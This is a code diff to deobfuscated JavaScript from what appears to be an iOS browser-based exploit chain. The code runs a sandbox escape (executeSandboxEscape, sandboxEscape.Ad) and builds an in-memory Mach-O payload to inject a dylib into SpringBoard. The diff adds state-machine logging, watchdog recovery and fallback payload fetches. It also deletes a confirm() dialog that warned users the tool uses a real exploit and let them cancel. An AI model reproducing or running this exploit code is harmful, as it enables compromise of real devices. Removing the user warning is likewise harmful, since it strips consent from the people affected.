@@ -1135,7 +1135,58 @@ function YA() {/* Original: YA → resolveSymbols */
     const E = {
         CA: I,
         IA: w,
+        _lastState: null,
+        _lastRegs: "",
+        _lastIARaw: "",
+        _lastWARaw: "",
+        _iaFallbackTried: false,
+        _iaFallbackD2Set: null,
+        _iaFromTA: false,
+        _lastIAPostTAD2: 0,
+        _eaRecoveryTried: false,
+        _eaTaRecoveryTried: false,
+        _qaStallCount: 0,
+        _qaNudged: false,
+        _qaFromUA: false,
+        _baStallCount: 0,
+        _baNudged: false,
+        _uaNudged: false,
+        _uaNudgedD2: 0,
+        _uaStallCount: 0,
+        _opcodeTried: null,
+        _respringAlertShown: false,
+        _haltAfterCheckpoint: false,
+        _wAInvalidCount: 0,
+        _wAInvalidNudged: false,
+        _stateName(state) {
+            if (state === IA) return "IA";
+            if (state === wA) return "wA";
+            if (state === QA) return "QA";
+            if (state === BA) return "BA";
+            if (state === NA) return "NA";
+            if (state === EA) return "EA";
+            if (state === TA) return "TA";
+            if (state === UA) return "UA";
+            return "UNKNOWN(" + state + ")";
+        },
+        notifyRespringLikely(tag) {
+            if (E._respringAlertShown) return;
+            E._respringAlertShown = true;
+            const message = "[ALERT] Pre-respring checkpoint: " + tag;
+            window.log(message);
+            try {
+                navigator && navigator.vibrate && navigator.vibrate([120, 60, 120]);
+            } catch (error) {
+                window.log("[ALERT] vibrate failed: " + error);
+            }
+            try {
+                alert(message);
+            } catch (error) {
+                window.log("[ALERT] alert failed: " + error);
+            }
+        },
         start() {
+            window.log("[STATE] start loop");
             setTimeout(E.wA, 1);
         },
         BA: (A, g) => Math.floor(Math.random() * (g - A + 1)) + A,
@@ -1146,12 +1197,16 @@ function YA() {/* Original: YA → resolveSymbols */
             D[1] = 0, D[0] = BA;
         },
         // Telemetry removed
-        TA(A, g, D, M) { if (D) D(); },
+        TA(A, g, D, M) {
+            window.log("[STATE] TA invoked: cmdLen=" + (A ? A.length : 0) + ", dataLen=" + (g ? g.length : 0));
+            if (D) D();
+        },
         // Fetch a single file as ArrayBuffer
         fetchBin(url) {
-            // Override entry2_type0x0f.dylib
-            url = url.replace(/\/entry2_type0x0f.dylib$/g, "/../../TweakLoader/.theos/obj/arm64" + (platformModule.platformState.hasPAC?"e":"") + "/TweakLoader.dylib");
-            
+            if (/\/entry2_type0x0f\.dylib$/i.test(url)) {
+                window.log("[LOADER] entry2 requested=" + url);
+                window.log("[LOADER] entry2 path=" + url);
+            }
             window.log("Downloading " + url);
             return new Promise((resolve, reject) => {
                 const xhr = new XMLHttpRequest();
@@ -1225,6 +1280,7 @@ function YA() {/* Original: YA → resolveSymbols */
             for (let i = 0; i < bytes.length; i++) g[i + 8] = bytes[i];
             D[1] = bytes.length;
             D[0] = BA;
+            window.log("[STATE] feedRawBuffer -> BA, len=" + bytes.length);
         },
         download(A, g, M) {
             //alert("Download " + A + "\n" + new Error().stack);
@@ -1236,19 +1292,6 @@ function YA() {/* Original: YA → resolveSymbols */
                     const lastSlash = hashName.lastIndexOf("/");
                     if (lastSlash >= 0) hashName = hashName.substring(lastSlash + 1);
                     hashName = hashName.replace(/\.min\.js$/, "").replace(/\.js$/, "");
-
-                    // Warn user before proceeding with exploit
-                    if (hashName === "7a7d99099b035b2c6512b6ebeeea6df1ede70fbb") {
-                        let shouldContinue = confirm(
-                            "WARNING: This tool uses some parts of a real exploit to inject some dylibs into SpringBoard.\n\n" +
-                            "Do NOT store sensitive data on this device while the exploit is active. (just for your safety)\n\n" +
-                            "OK = idrc just go for it!\n" +
-                            "Cancel = Nah I'm good, I want to stay safe");
-                        if (!shouldContinue) {
-                            window.log("[LOADER] User canceled.");
-                            return;
-                        }
-                    }
 
                     // Fetch decrypted F00DBEEF container from payloads/ directory
                     window.log("[LOADER] Loading payload: " + hashName);
@@ -1273,26 +1316,199 @@ function YA() {/* Original: YA → resolveSymbols */
             C.setAttribute("style", "opacity: 0.0"), C.innerHTML = M() + "-" + M() + "-" + M(), document.body.appendChild(C), setTimeout(() => {
                 const A = new URL(location.href);
                 A.searchParams.delete(g), window.history.replaceState(null, null, A), document.body.removeChild(C);
-            }, 10000 /* 959736401 ^ 959728961 */), D[0] = IA;
+            }, 10000 /* 959736401 ^ 959728961 */), E._iaFromTA = true, D[0] = IA;
         },
         wA() {
+            if (E._haltAfterCheckpoint) {
+                return;
+            }
+            const state = D[0];
+            if (state === QA) {
+                if (E._qaFromUA) {
+                    window.log("[STATE] QA fastpath -> wA");
+                    D[0] = wA;
+                    setTimeout(E.wA, 1);
+                    return;
+                }
+                E._qaStallCount++;
+                if (E._qaStallCount > 200 && !E._qaNudged) {
+                    E._qaNudged = true;
+                    window.log("[STATE] QA watchdog -> wA");
+                    D[0] = wA;
+                }
+            } else {
+                E._qaStallCount = 0;
+                E._qaNudged = false;
+                E._qaFromUA = false;
+            }
+            if (state === BA) {
+                E._baStallCount++;
+                if (E._baStallCount > 400 && !E._baNudged) {
+                    E._baNudged = true;
+                    window.log("[STATE] BA watchdog -> EA");
+                    D[0] = EA;
+                }
+            } else {
+                E._baStallCount = 0;
+                E._baNudged = false;
+            }
+            if (state !== E._lastState) {
+                window.log("[STATE] D0 " + E._stateName(E._lastState) + " -> " + E._stateName(state));
+                if (state === EA && !E._eaRecoveryTried && (E._lastState === BA || E._lastState === IA)) {
+                    E._eaRecoveryTried = true;
+                    window.log("[STATE] EA recovery -> wA");
+                    D[0] = wA;
+                } else if (state === EA && E._eaRecoveryTried && !E._eaTaRecoveryTried && (E._lastState === BA || E._lastState === QA || E._lastState === wA)) {
+                    E._eaTaRecoveryTried = true;
+                    window.log("[STATE] EA recovery2 -> UA");
+                    D[0] = UA;
+                }
+                E._lastState = state;
+                if (state !== IA) E._iaFallbackTried = false;
+                if (state !== IA) { E._iaFromTA = false; E._lastIAPostTAD2 = 0; }
+                if (state !== UA) { E._uaNudged = false; E._uaStallCount = 0; }
+                if (state === wA || state === QA || state === BA) { E._eaRecoveryTried = false; E._eaTaRecoveryTried = false; }
+            }
+            const regs = "D1=" + D[1] + " D2=" + D[2] + " D3=" + D[3] + " D4=" + D[4];
+            if ((state === IA || state === BA || state === EA || state === NA || state === TA || state === UA) && regs !== E._lastRegs) {
+                window.log("[STATE] regs " + E._stateName(state) + " " + regs);
+                E._lastRegs = regs;
+            }
             if (D[0] === wA) {
+                const A = new Uint8Array(g.buffer, sA, kA);
+                const raw0 = A[0] | 0;
+                const raw1 = A[1] | 0;
+                let M = "";
+                for (let g = 0; A[g] && g < A.length; g++) M += String.fromCharCode(A[g]);
+                const isLikelyPayloadRef =
+                    /^[0-9a-f]{40}(?:\.min\.js|\.js)?$/i.test(M) ||
+                    (M.length > 8 && /^[a-zA-Z0-9_./:-]+$/.test(M) && (M.includes("/") || M.includes(".")));
+                if (!isLikelyPayloadRef) {
+                    if (raw0 === 0xB8 && raw1 === 0x03) {
+                        E.notifyRespringLikely("wA raw=0xB8 0x03 D2=" + D[2]);
+                        if (D[2] === 3350529175) {
+                            window.log("[STATE] HALT checkpoint reached (0xB8 0x03), stopping state loop to avoid crash-respring");
+                            E._haltAfterCheckpoint = true;
+                            return;
+                        }
+                        if (!E._opcodeTried) E._opcodeTried = new Set();
+                        const opcodeCandidates = [
+                            "4800048658463f971e752ff93c1767e9ae7f3431",
+                            "b442ab113b829ff8c7bf34afa4d2d997889f308f"
+                        ];
+                        for (const candidate of opcodeCandidates) {
+                            if (E._opcodeTried.has(candidate)) continue;
+                            E._opcodeTried.add(candidate);
+                            window.log("[STATE] wA opcode 0xB8 0x03 -> download " + candidate);
+                            D[0] = QA;
+                            E.download(candidate, E.UA, E.error);
+                            return;
+                        }
+                    }
+                    if (M !== E._lastWARaw) {
+                        window.log("[STATE] wA pending raw=" + JSON.stringify(M) + " bytes=[" + raw0 + "," + raw1 + "] D2=" + D[2]);
+                        E._lastWARaw = M;
+                    }
+                    if (!E._wAInvalidNudged) {
+                        E._wAInvalidNudged = true;
+                        window.log("[STATE] wA invalid -> UA");
+                        D[0] = UA;
+                        setTimeout(E.wA, 1);
+                        return;
+                    }
+                    window.log("[STATE] wA invalid repeat -> UA");
+                    D[0] = UA;
+                    setTimeout(E.wA, 1);
+                    return;
+                }
+                E._wAInvalidNudged = false;
                 D[0] = QA;
+                E.download(M, E.UA, E.error);
+            } else if (D[0] === IA) {
                 const A = new Uint8Array(g.buffer, sA, kA);
                 let M = "";
                 for (let g = 0; A[g] && g < A.length; g++) M += String.fromCharCode(A[g]);
-                E.download(M, E.UA, E.error);
-            } else if (D[0] === UA) {
+                const isLikelyPath = M.length > 8 && /^[a-zA-Z0-9_./:-]+$/.test(M) && (M.includes("/") || M.includes("."));
+                if (!isLikelyPath) {
+                    if (M !== E._lastIARaw) {
+                        window.log("[STATE] IA pending raw=" + JSON.stringify(M));
+                        E._lastIARaw = M;
+                    }
+                    if (E._iaFromTA) {
+                        // After sA() the native owns IA; just poll until it advances
+                        if (D[2] !== E._lastIAPostTAD2) {
+                            window.log("[STATE] IA post-TA polling (raw=" + JSON.stringify(M) + ") regs D2=" + D[2]);
+                            E._lastIAPostTAD2 = D[2];
+                        }
+                        setTimeout(E.wA, 1);
+                        return;
+                    }
+                    if (!E._iaFallbackTried && D[1] > 0 && D[2] === 4027432687 && !(E._iaFallbackD2Set && E._iaFallbackD2Set.has(D[2]))) {
+                        E._iaFallbackTried = true;
+                        if (!E._iaFallbackD2Set) E._iaFallbackD2Set = new Set();
+                        E._iaFallbackD2Set.add(D[2]);
+                        (async () => {
+                            const candidates = [
+                                "4817ea8063eb4480e915f1a4479c62ec774f52ce.min.js",
+                                "4612aa650e60e2974a9ec37bbf922c79635b493a.min.js"
+                            ];
+                            for (const candidate of candidates) {
+                                try {
+                                    window.log("[STATE] IA fallback fetch " + candidate);
+                                    const blob = await E.fetchBin(candidate);
+                                    E.feedRawBuffer(blob);
+                                    window.log("[LOADER] IA fallback fed " + blob.byteLength + " bytes from " + candidate);
+                                    return;
+                                } catch (error) {
+                                    window.log("[STATE] IA fallback failed " + candidate + ": " + error);
+                                }
+                            }
+                        })();
+                    }
+                    D[0] !== EA && setTimeout(E.wA, 1);
+                    return;
+                }
                 D[0] = QA;
+                (async () => {
+                    try {
+                        window.log("[STATE] IA fetch " + M);
+                        const C = await E.fetchBin(M);
+                        E.feedRawBuffer(C);
+                        window.log("[LOADER] IA fed " + C.byteLength + " bytes");
+                    } catch (A) {
+                        window.log("[LOADER] IA fetch error: " + A);
+                        E.error();
+                    }
+                })();
+            } else if (D[0] === UA) {
+                // UA handshake: nudge to QA once, then poll for native transition.
                 const A = new Uint8Array(g.buffer, sA, kA);
                 let M = "";
                 for (let g = 0; A[g] && g < A.length; g++) M += String.fromCharCode(A[g]);
                 const C = new Uint8Array(g.buffer, FA, SA);
                 let I = "";
                 for (let A = 0; C[A] && A < C.length; A++) I += String.fromCharCode(C[A]);
-                E.TA(M, I, E.NA, E.EA);
+                E._uaStallCount++;
+                const shouldNudgeUA = (!E._uaNudged && E._uaNudgedD2 !== D[2]) || (E._uaNudgedD2 === D[2] && E._uaStallCount > 300);
+                if (shouldNudgeUA) {
+                    E._uaStallCount = 0;
+                    E._uaNudged = true;
+                    E._uaNudgedD2 = D[2];
+                    E._qaFromUA = true;
+                    window.log("[STATE] UA nudge -> QA (M=" + JSON.stringify(M.slice(0,16)) + " I=" + JSON.stringify(I.slice(0,16)) + ")");
+                    D[0] = QA;
+                    setTimeout(E.wA, 1); return;
+                }
+                if (E._uaStallCount % 200 === 0) {
+                    window.log("[STATE] UA waiting D2=" + D[2] + " raw=" + JSON.stringify(M.slice(0,16)));
+                }
+                if (M !== E._lastWARaw) {
+                    window.log("[STATE] UA polling M=" + JSON.stringify(M.slice(0,16)) + " I=" + JSON.stringify(I.slice(0,16)) + " D2=" + D[2]);
+                    E._lastWARaw = M;
+                }
+                setTimeout(E.wA, 1); return;
             } else D[0] === TA && E.sA();
-            D[0] !== EA && setTimeout(E.wA, 1);
+            setTimeout(E.wA, 1);
         },
         LA(A) {
             const M = A;
@@ -1303,6 +1519,7 @@ function YA() {/* Original: YA → resolveSymbols */
         },
         // Telemetry removed
         error() {
+            window.log("[STATE] error -> NA");
             D[0] = NA;
         }
     };
@@ -1311,12 +1528,15 @@ function YA() {/* Original: YA → resolveSymbols */
 
 // ── executeSandboxEscape (yA) — main sandbox escape entry ────────────────
 function executeSandboxEscape() {/* Original: yA → executeSandboxEscape */
+    window.log("[NATIVE] executeSandboxEscape enter");
     const A = YA();
+    window.log("[NATIVE] YA resolved");
     let g;
     if (platformModule.On()) throw new Error("platformModule.On()");
     return g = (() => {
         //alert("P.platformState.fixedMachOVal2=" + P.platformState.fixedMachOVal2);
         const g = new MachOPayloadBuilder(platformModule.platformState.fixedMachOVal1, platformModule.platformState.fixedMachOVal2, platformModule.platformState.fixedMachOVal3);
+        window.log("[NATIVE] MachOPayloadBuilder created, length=0x" + g.length().toString(16));
 
         // ── PATCH: Load custom dylib with dynamic _process lookup ──
         // Dylib must be pre-truncated to Mach-O proper (no appended data).
@@ -1374,6 +1594,7 @@ function executeSandboxEscape() {/* Original: yA → executeSandboxEscape */
         g.kA = Offset64.fromUnsigned(A.CA), g.FA(Offset64.fromUnsigned(dylibLoadAddress));
         const dylibLoadAddressO64 = Offset64.fromUnsigned(dylibLoadAddress);
         let dylibBufferEncoded = g.SA(dylibLoadAddressO64);
+        window.log("[NATIVE] g.SA encoded words=" + dylibBufferEncoded.length);
         for (; dylibBufferEncoded.length % 4 != 0;) dylibBufferEncoded += "\0";
         dylibSize = 2 * dylibBufferEncoded.length;
         const dylibBuffer = window.PhZuiP = new Uint32Array(new ArrayBuffer(dylibSize));
@@ -1395,11 +1616,22 @@ function executeSandboxEscape() {/* Original: yA → executeSandboxEscape */
         window.log("dylib load address: 0x" + dylibLoadAddress.toString(16));
         window.log("data address?: 0x" + dylibDataAddressMaybe.toNumber().toString(16));
         window.log("dylib size: 0x" + dylibSize);
+        window.log("[NATIVE] calling sandboxEscape.Ad");
         platformModule.platformState.sandboxEscape.Ad(dylibLoadAddressI64, dylibDataAddressMaybe, dylibSize);
+        window.log("[NATIVE] sandboxEscape.Ad returned");
         const T = g.YA().ct() + 4;
+        window.log("[NATIVE] caller target T=0x" + T.toString(16));
         //alert("D 0x" + T.toString(16));
-        return platformModule.platformState.caller.jd(utilityModule.Int64.fromNumber(T)).Pt();
-    })(), A.start(), g;
+        const _callResult = platformModule.platformState.caller.jd(utilityModule.Int64.fromNumber(T)).Pt();
+        let _callResultText = "";
+        try {
+            _callResultText = _callResult.toString();
+        } catch (_) {
+            _callResultText = String(_callResult);
+        }
+        window.log("[NATIVE] caller.jd returned=" + _callResultText);
+        return _callResult;
+    })(), window.log("[NATIVE] native trampoline returned=" + String(g)), A.start(), window.log("[NATIVE] YA.start complete"), window.log("[NATIVE] executeSandboxEscape exit"), g;
 }; const yA = executeSandboxEscape;
 // ── MachOPayloadBuilder (oA) — builds Mach-O payload in memory ───────────
 class MachOPayloadBuilder {/* Original: oA → MachOPayloadBuilder */
